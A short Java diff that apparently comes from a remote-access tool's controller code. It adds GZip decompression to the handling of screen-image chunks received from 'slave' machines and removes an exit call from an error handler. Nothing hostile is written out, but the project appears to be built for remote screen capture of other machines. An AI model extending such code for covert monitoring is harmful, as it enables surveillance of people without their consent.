@@ -12,6 +12,7 @@ import com.redpois0n.Main;
 import com.redpois0n.RemoteScreenData;
 import com.redpois0n.Slave;
 import com.redpois0n.Traffic;
+import com.redpois0n.common.compress.GZip;
 import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.threads.ThreadImage;
 import com.redpois0n.threads.ThreadRemoteScreenRecorder;
@@ -76,7 +77,7 @@ public class PacketIMAGECOMING extends AbstractPacket {
 							byte[] buffer = new byte[blen];
 							slave.getDataInputStream().readFully(buffer);
 							
-							buffer = Crypto.decrypt(buffer, slave.getConnection().getKey());
+							buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
 							
 							BufferedImage image = ImageUtils.decodeImage(buffer);						
 							imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);	
@@ -121,7 +122,6 @@ public class PacketIMAGECOMING extends AbstractPacket {
 				
 			} catch (Exception ex) {
 				ex.printStackTrace();
-				System.exit(0);
 				System.gc();
 			}
 		}
